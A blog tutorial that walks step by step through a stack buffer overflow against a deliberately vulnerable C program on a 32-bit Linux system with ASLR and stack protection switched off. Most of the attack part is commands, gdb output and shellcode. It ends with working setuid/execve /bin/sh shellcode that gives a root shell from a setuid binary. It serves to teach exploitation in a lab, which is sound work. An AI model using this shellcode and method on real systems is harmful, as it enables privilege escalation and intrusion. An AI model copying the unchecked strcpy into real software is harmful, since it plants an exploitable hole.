---
layout: post
title: Buffer Overflows 101
---

### {{ page.title }}

So I thought I'd knock together a short Buffer Overflow 101 tutorial, everyone has to start somewhere so I though I'd give some guys a leg up. Although this tutorial is _realistic_ we're going to have to turn off some of the new features (if you're running a new'ish version of Linux) in the kernel and gcc to make things easier. Once you've got the basics mastered we can start turning them back on and see how you can get around them!

Before I kick off, I assume a reasonable amount of knowledge, this isn't the sort of thing my mum is going to be able to do; basic C/Linux/Assembler (Intel) and computing fundamentals (stacks etc.).

#### Things to turn off to make this easier

##### WTF is randomize_va_space?

Most new (ish) Linux distributions ship with "randomize_va_space" enabled, this means the kernel loads all the dynamically linked libraries in random positions within the processes memory! (__note:__ depending what level this is set to it can randomdize different parts of a process; heap, stack, etc.) This make buffer overflows very hard - we'll get to why later!

    tim@blue:~/devel/buffer_overflows_101$ cat /proc/sys/kernel/randomize_va_space
    1

as you can see - on my Ubuntu (gutsy) box it's enabled, to disable it simply:

    tim@blue:~$ sudo /bin/sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
    tim@blue:~$ cat /proc/sys/kernel/randomize_va_space
    0

##### WTF are gcc stack canaries?

gcc has had stack smashing protection since sometime back in 1997 - but hasn't been that widely used until recently. So once again - gcc will now commonly default to using some form of stack protection. So make sure you're not compiling with SSP (Stack Smashing Protection) etc. Canaries are expendable variables that live at the end of buffers - by testing the value of this memory location the application can tell if the buffer has been overflowed. For canaries to be affective they mustn't be predictable. So disable gcc's stack protection, make sure you remember to use the "-Wno-stack-protector -fno-stack-protector" flags.

#### So what is a Buffer Overflow?

A buffer overflow occurs simply when too much data is copied into an insufficient buffer. The actual reason we get execution is because after execution of the vulnerable function completes it pulls the return address off the stack and puts its in EIP (this is the way execution continues in the calling function) and during the overflow it's can be possible to over write that return address with the address of our shellcode.

This is one of the reasons the randomize_va_space makes exploitation difficult - the address of the stack isn't predictable - so we don't know what to over write the return address with.

#### So lets get to it....

So we need a simple vulnerable app to play with (vuln.c)...


    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    void foo(char *in) {
            char tmp[256];
            strcpy(tmp,in);
            printf("argument was: %s\n",tmp);
            return;
    }

    int main(int argc,char **argv) {
            if(argc < 2) {
                    printf("%s <argument>\n",argv[0]);
                    return 0;
            }
            printf("before call\n");
            foo(argv[1]);
            printf("after call\n");
            return 0;
    }


So hopefully everyone has noticed how this app is exploitable....we copy the first argument (from the command line) into a 256 byte buffer without checking how long it is!! So we should be able to over write the RET address and gain execution.

So lets just check we can break the application....

    tim@blue:~/devel/buffer_overflows_101$ gcc -Wall vuln.c -o vuln
    tim@blue:~/devel/buffer_overflows_101$ ./vuln f00
    before call
    argument was: f00
    after call
    tim@blue:~/devel/buffer_overflows_101$ ./vuln `perl -e 'print "A" x 300'`
    before call
    argument was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    *** stack smashing detected ***: ./vuln terminated
    Aborted (core dumped)
    tim@blue:~/devel/buffer_overflows_101$ gcc -Wall -Wno-stack-protector -fno-stack-protector vuln.c -o vuln
    tim@blue:~/devel/buffer_overflows_101$ ./vuln `perl -e 'print "A" x 300'`
    before call
    argument was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation fault (core dumped)
    tim@blue:~/devel/buffer_overflows_101$ ls
    vuln  vuln.c
    tim@blue:~/devel/buffer_overflows_101$

As you can see I forgot to build the code with the flags to stop gcc adding its stack protection; the application would have been terminated before we would have gained execution. But once I compiled it correctly...

We didn't get a core file because my default ulimits aren't high enough - so we better fix that...

    tim@blue:~/devel/buffer_overflows_101$ ulimit -c unlimited
    tim@blue:~/devel/buffer_overflows_101$ ./vuln `perl -e 'print "A" x 300'`
    before call
    argument was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation fault (core dumped)
    tim@blue:~/devel/buffer_overflows_101$ ls
    core  vuln  vuln.c
    tim@blue:~/devel/buffer_overflows_101$

So lets see if we had control of EIP!

    tim@blue:~/devel/buffer_overflows_101$ gdb ./vuln ./core
    GNU gdb 6.6-debian
    Copyright (C) 2006 Free Software Foundation, Inc.
    GDB is free software, covered by the GNU General Public License, and you are
    welcome to change it and/or distribute copies of it under certain conditions.
    Type "show copying" to see the conditions.
    There is absolutely no warranty for GDB.  Type "show warranty" for details.
    This GDB was configured as "i486-linux-gnu"...
    Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
    
    warning: Can't read pathname for load map: Input/output error.
    Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.
    Loaded symbols for /lib/tls/i686/cmov/libc.so.6
    Reading symbols from /lib/ld-linux.so.2...done.
    Loaded symbols for /lib/ld-linux.so.2
    Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
    Program terminated with signal 11, Segmentation fault.
    #0  0x41414141 in ?? ()
    (gdb) info reg
    eax            0x13b    315
    ecx            0x0      0
    edx            0xb7fd40d0       -1208139568
    ebx            0xb7fd2ff4       -1208143884
    esp            0xbffff960       0xbffff960
    ebp            0x41414141       0x41414141
    esi            0xb8000ce0       -1207956256
    edi            0x0      0
    eip            0x41414141       0x41414141
    eflags         0x210286 [ PF SF IF RF ID ]
    cs             0x73     115
    ss             0x7b     123
    ds             0x7b     123
    es             0x7b     123
    fs             0x0      0
    gs             0x33     51
    (gdb) quit
    tim@blue:~/devel/buffer_overflows_101$

Very nice! As you can see from the above 'info reg' EIP (the instruction pointer - points to the next instruction in memory) is pointing at 0x41414141 - which comes from 'AAAA'!! But what 'A' do you think it is? We did send 300 after all? We could add some 'B's etc and find it that way, but there is a much easier method - thanks to the guys at the Metasploit project. If you download Metasploit framework 3 at <http://framework.metasploit.com/msf/downloader/?id=framework-3.1.tar.gz>, I'm using 3.1 Release. You'll need ruby (and libopenssl-rub) btw - so get that installed too (apt-get install ruby libopenssl-ruby for the debian/ubuntu d00ds).

There's a script which will create a non repeating sequence of printable characters, so we can throw that into our buffer and then use another script to tell us which byte lands in EIP (or any other location we're interested in). Remember to delete the old core btw - the kernel will not overwrite the existing core dump.

    tim@blue:~/devel/buffer_overflows_101$ rm core
    tim@blue:~/devel/buffer_overflows_101$ ./vuln `./framework-3.1/tools/pattern_create.rb 300`
    before call
    argument was: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
    Segmentation fault (core dumped)
    tim@blue:~/devel/buffer_overflows_101$ gdb ./vuln ./core
    GNU gdb 6.6-debian
    Copyright (C) 2006 Free Software Foundation, Inc.
    GDB is free software, covered by the GNU General Public License, and you are
    welcome to change it and/or distribute copies of it under certain conditions.
    Type "show copying" to see the conditions.
    There is absolutely no warranty for GDB.  Type "show warranty" for details.
    This GDB was configured as "i486-linux-gnu"...
    Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

    warning: Can't read pathname for load map: Input/output error.
    Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.
    Loaded symbols for /lib/tls/i686/cmov/libc.so.6
    Reading symbols from /lib/ld-linux.so.2...done.
    Loaded symbols for /lib/ld-linux.so.2
    Core was generated by `./vuln Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3'.
    Program terminated with signal 11, Segmentation fault.
    #0  0x37694136 in ?? ()
    (gdb) quit
    tim@blue:~/devel/buffer_overflows_101$ ./framework-3.1/tools/pattern_offset.rb 0x37694136 300
    260
    tim@blue:~/devel/buffer_overflows_101$

Easy uh? EIP starts on the 260'th byte! So lets fill EIP with 'B's.....

    tim@blue:~/devel/buffer_overflows_101$ ./vuln `perl -e 'print "A"x260 . "B"x4'`
    before call
    argument was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
    Segmentation fault (core dumped)
    tim@blue:~/devel/buffer_overflows_101$ gdb ./vuln ./core
    GNU gdb 6.6-debian
    Copyright (C) 2006 Free Software Foundation, Inc.
    GDB is free software, covered by the GNU General Public License, and you are
    welcome to change it and/or distribute copies of it under certain conditions.
    Type "show copying" to see the conditions.
    There is absolutely no warranty for GDB.  Type "show warranty" for details.
    This GDB was configured as "i486-linux-gnu"...
    Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

    warning: Can't read pathname for load map: Input/output error.
    Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.
    Loaded symbols for /lib/tls/i686/cmov/libc.so.6
    Reading symbols from /lib/ld-linux.so.2...done.
    Loaded symbols for /lib/ld-linux.so.2
    Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
    Program terminated with signal 11, Segmentation fault.
    #0  0x42424242 in ?? ()
    (gdb) quit
    tim@blue:~/devel/buffer_overflows_101$

So we now have complete control of EIP! So we know need to be able to do something with it. So if we're going to inject some shellcode - we need to know where its going to start, so we can set EIP to the start of the eggcode. So lets find the start of the buffer (looking around ESP is always a good place to start with stack overflows)....

    tim@blue:~/devel/buffer_overflows_101$ gdb ./vuln ./core
    GNU gdb 6.6-debian
    Copyright (C) 2006 Free Software Foundation, Inc.
    GDB is free software, covered by the GNU General Public License, and you are
    welcome to change it and/or distribute copies of it under certain conditions.
    Type "show copying" to see the conditions.
    There is absolutely no warranty for GDB.  Type "show warranty" for details.
    This GDB was configured as "i486-linux-gnu"...
    Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

    warning: Can't read pathname for load map: Input/output error.
    Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.
    Loaded symbols for /lib/tls/i686/cmov/libc.so.6
    Reading symbols from /lib/ld-linux.so.2...done.
    Loaded symbols for /lib/ld-linux.so.2
    Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
    Program terminated with signal 11, Segmentation fault.
    #0  0x42424242 in ?? ()
    (gdb) x/10 $esp-20
    0xbffff97c:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff98c:     0x42424242      0xbffffb00      0x08049670      0xbffff9b8
    0xbffff99c:     0xbffff9c0      0xb7ff3800
    (gdb) # so there's the end of the buffer (including the 'B's) so lets look further up
    (gdb) x/100 $esp-270
    0xbffff882:     0xf8880804      0x4141bfff      0x41414141      0x41414141
    0xbffff892:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff8a2:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff8b2:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff8c2:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff8d2:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff8e2:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff8f2:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff902:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff912:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff922:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff932:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff942:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff952:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff962:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff972:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffff982:     0x41414141      0x41414141      0x42424141      0xfb004242
    0xbffff992:     0x9670bfff      0xf9b80804      0xf9c0bfff      0x3800bfff
    0xbffff9a2:     0xf9c0b7ff      0xfa18bfff      0x3050bfff      0x0ce0b7ea
    0xbffff9b2:     0x84a0b800      0xfa180804      0x3050bfff      0x0002b7ea
    0xbffff9c2:     0xfa440000      0xfa50bfff      0x1820bfff      0x0000b800
    0xbffff9d2:     0x00010000      0x00010000      0x00000000      0x2ff40000
    0xbffff9e2:     0x0ce0b7fd      0x0000b800      0xfa180000      0x8081bfff
    0xbffff9f2:     0x2a91ebf3      0x0000c060      0x00000000      0x00000000
    0xbffffa02:     0x86600000      0x2f7db7ff      0x0ff4b7ea      0x0002b800
    (gdb) x/1 $esp-264
    0xbffff888:     0x41414141
    (gdb) quit
    tim@blue:~/devel/buffer_overflows_101$

So we know to set EIP to 0xbffff888 - but we need some code to do something rather than just 'A's! Note the bytes that land of EIP just be in reverse byte order, as I'm working on a Intel machine.

    tim@blue:~/devel/buffer_overflows_101$ rm core &amp;&amp; ./vuln `perl -e 'print "A"x260 . "\\x88\\xf8\\xff\\xbf"'`
    before call
    argument was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
    Segmentation fault (core dumped)
    tim@blue:~/devel/buffer_overflows_101$ gdb ./vuln ./core
    GNU gdb 6.6-debian
    Copyright (C) 2006 Free Software Foundation, Inc.
    GDB is free software, covered by the GNU General Public License, and you are
    welcome to change it and/or distribute copies of it under certain conditions.
    Type "show copying" to see the conditions.
    There is absolutely no warranty for GDB.  Type "show warranty" for details.
    This GDB was configured as "i486-linux-gnu"...
    Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

    warning: Can't read pathname for load map: Input/output error.
    Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.
    Loaded symbols for /lib/tls/i686/cmov/libc.so.6
    Reading symbols from /lib/ld-linux.so.2...done.
    Loaded symbols for /lib/ld-linux.so.2
    Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
    Program terminated with signal 11, Segmentation fault.
    #0  0xbffff888 in ?? ()
    (gdb) quit
    tim@blue:~/devel/buffer_overflows_101$

Cool, now lets write some shellcode! OK just a simple one to start with; we're call exit() with a given status code so we can prove the shellcode has executed. Our vuln app can only return a status of 0 (see the code)

    tim@blue:~/devel/buffer_overflows_101$ ./vuln d00d
    before call
    argument was: d00d
    after call
    tim@blue:~/devel/buffer_overflows_101$ echo $?
    0
    tim@blue:~/devel/buffer_overflows_101$

The easiest way to write shellcode is to write what you want to do in C and take the machine code out of it...

    tim@blue:~/devel/buffer_overflows_101$ cat exitCode.c
    #include <unistd.h>
    int main(void) {
            _exit(123);
    }
    tim@blue:~/devel/buffer_overflows_101$ gcc -Wall exitCode.c -o exitCode -static
    tim@blue:~/devel/buffer_overflows_101$ ./exitCode
    tim@blue:~/devel/buffer_overflows_101$ echo $?
    123
    tim@blue:~/devel/buffer_overflows_101$

Note I've statically compiled the code - I'd like all the code inside this one executable rather then jumping into shared libraries. Now lets try to turn this into shellcode...

    tim@blue:~/devel/buffer_overflows_101$ gdb ./exitCode
    GNU gdb 6.6-debian
    Copyright (C) 2006 Free Software Foundation, Inc.
    ...
    (gdb) disas main
    Dump of assembler code for function main:
    0x08048208 <main+0>:    lea    0x4(%esp),%ecx
    0x0804820c <main+4>:    and    $0xfffffff0,%esp
    0x0804820f <main+7>:    pushl  0xfffffffc(%ecx)
    0x08048212 <main+10>:   push   %ebp
    0x08048213 <main+11>:   mov    %esp,%ebp
    0x08048215 <main+13>:   push   %ecx
    0x08048216 <main+14>:   sub    $0x4,%esp
    0x08048219 <main+17>:   movl   $0x7b,(%esp)
    0x08048220 <main+24>:   call   0x804dffc &lt;_exit&gt;
    End of assembler dump.
    (gdb) disas _exit
    Dump of assembler code for function _exit:
    0x0804dffc &lt;_exit+0&gt;:   mov    0x4(%esp),%ebx
    0x0804e000 &lt;_exit+4&gt;:   mov    $0xfc,%eax
    0x0804e005 &lt;_exit+9&gt;:   int    $0x80
    0x0804e007 &lt;_exit+11&gt;:  mov    $0x1,%eax
    0x0804e00c &lt;_exit+16&gt;:  int    $0x80
    0x0804e00e &lt;_exit+18&gt;:  hlt
    End of assembler dump.
    (gdb)
    </main+24></main+17></main+14></main+13></main+11></main+10></main+7></main+4></main+0>

So if you know anything about Linux syscalls you can see we're making two syscalls here. We're calling syscall 0xfc and 0x01 with our passed argument. If you look in /usr/include/asm-i386/unistd.h you can see our syscalls

    tim@blue:~/devel/buffer_overflows_101$ egrep \\ 1$\\|252 /usr/include/asm-i386/unistd.h
    #define __NR_exit                 1
    #define __NR_exit_group         252

We're not really interested in exit_group - so we won't bother with that. You can also see the argument is passed into the kernel on ebx, so we need something like:

```asm
    mov $0x7B,%ebx
    mov $0x01,%eax
    int $0x80
```

Using the output of `objdump -d exitCode` can make things easier...

    0804dffc &lt;_exit&gt;:
     804dffc:       8b 5c 24 04             mov    0x4(%esp),%ebx
     804e000:       b8 fc 00 00 00          mov    $0xfc,%eax
     804e005:       cd 80                   int    $0x80
     804e007:       b8 01 00 00 00          mov    $0x1,%eax
     804e00c:       cd 80                   int    $0x80
     804e00e:       f4                      hlt
     804e00f:       90                      nop

    tim@blue:~/devel/buffer_overflows_101/shell/exit$ cat exit.asm
    SEGMENT.text
            mov eax, 1
            mov ebx, 123
            int 80h

    tim@blue:~/devel/buffer_overflows_101/shell/exit$ nasm -felf exit.asm
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ gcc exit.o -o exit -nostartfiles -nostdlib
    /usr/bin/ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ ./exit
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ echo $?
    123
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ objdump -d exit

    exit:     file format elf32-i386

    Disassembly of section .text:

    08048060 <segment.text>:
     8048060:       b8 01 00 00 00          mov    $0x1,%eax
     8048065:       bb 7b 00 00 00          mov    $0x7b,%ebx
     804806a:       cd 80                   int    $0x80

So our shellcode should be "\\xb8\\x01\\x00\\x00\\x00\\xbb\\x7b\\x00\\x00\\x00\\xcd\\x80" - we can test this by:

    tim@blue:~/devel/buffer_overflows_101/shell/exit$ cat test_code.c
    const char exit_shell[]="\\xb8\\x01\\x00\\x00\\x00\\xbb\\x7b\\x00\\x00\\x00\\xcd\\x80";
    main() {
            int (*shell)();
            shell=exit_shell;
            shell();
    }
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ gcc test_code.c -o test
    test_code.c: In function ‘main’:
    test_code.c:4: warning: assignment from incompatible pointer type
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ ./test
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ echo $?
    123
    tim@blue:~/devel/buffer_overflows_101/shell/exit$

looks good but....there are 0x00 in that shellcode which means it can be put in a string! :(

so we have to remove all the NULL characters out of the code while obviously making sure its still valid ASM and does what we want it too. There are quite a few tricks to do this, but most are probably out of scope of this tutorial...lets try this:

    tim@blue:~/devel/buffer_overflows_101/shell/exit$ cat exit2.asm
    SEGMENT.text
            xor eax, eax    ; zeros eax
            mov al, 1       ; put 1 in the lowest 8bits of eax
            xor ebx, ebx    ; zeros ebx
            mov bl, 123     ; put 123 in the lowest 8bits of ebx
            int 80h         ; int 80 (enter syscall)

    tim@blue:~/devel/buffer_overflows_101/shell/exit$ nasm -felf exit2.asm
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ gcc exit2.o -o exit2 -nostartfiles -nostdlib
    /usr/bin/ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ ./exit2
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ echo $?
    123
    tim@blue:~/devel/buffer_overflows_101/shell/exit$ objdump -d exit2

    exit2:     file format elf32-i386

    Disassembly of section .text:

    08048060 <segment.text>:
     8048060:       31 c0                   xor    %eax,%eax
     8048062:       b0 01                   mov    $0x1,%al
     8048064:       31 db                   xor    %ebx,%ebx
     8048066:       b3 7b                   mov    $0x7b,%bl
     8048068:       cd 80                   int    $0x80

So our shellcode is now "\\x31\\xc0\\xb0\\x01\\x31\\xdb\\x3b\\x7b\\xcd\\x80" - lets test it!

So we originally had 260 bytes of overflow then EIP, and our shellcode is 10 bytes...so we want 10 bytes of shellcode followed by 250 of stuff and finally EIP on the end.

    tim@blue:~/devel/buffer_overflows_101$ ./vuln `perl -e 'print "\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xb3\\x7b\\xcd\\x80" . "A"x250 . "\\x88\\xf8\\xff\\xbf"'`
    before call
    argument was: 1��1۳{̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
    tim@blue:~/devel/buffer_overflows_101$ echo $?
    123
    tim@blue:~/devel/buffer_overflows_101$

__w00p!!__

OK so we're not 260 bytes of machine code to play with - what can we do?

A quick look at mil0worm (http://www.milw0rm.com/shellcode/2042) nice setuid and execve /bin/sh in 30 bytes.

    "\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80"

See here we actually create the string on the stack - so our code is truly position independent (without playing call-ret games). So lets give it a go... (260-30=230)

    tim@blue:~/devel/buffer_overflows_101$ ./vuln `perl -e 'print "\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80" . "A"x230 . "\\x88\\xf8\\xff\\xbf"'`
    before call
    argument was: jX1�̀j
                         X�Rh//shh/bin��RS��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
    $ id
    uid=1001(tim) gid=1001(tim) groups=110(admin),1001(tim)
    $ exit
    tim@blue:~/devel/buffer_overflows_101$

the code is actually doing a setuid(0) - which isn't working because the file is owned by tim and not root....

    tim@blue:~/devel/buffer_overflows_101$ sudo chown root.root vuln &amp;&amp; sudo chmod u+s vuln
    tim@blue:~/devel/buffer_overflows_101$ ./vuln `perl -e 'print "\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80" . "A"x230 . "\\x88\\xf8\\xff\\xbf"'`
    before call
    argument was: jX1�̀j
                         X�Rh//shh/bin��RS��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
    # id
    uid=0(root) gid=1001(tim) groups=110(admin),1001(tim)
    # exit
    tim@blue:~/devel/buffer_overflows_101$

And now I've got a privilege escalation sitting on my desktop - I'll leave you to play with stuff.
Feel free to ask questions/corrections here and I'll do my best to answer them. Hope you enjoyed my Buffer Overflow 101 walk though.

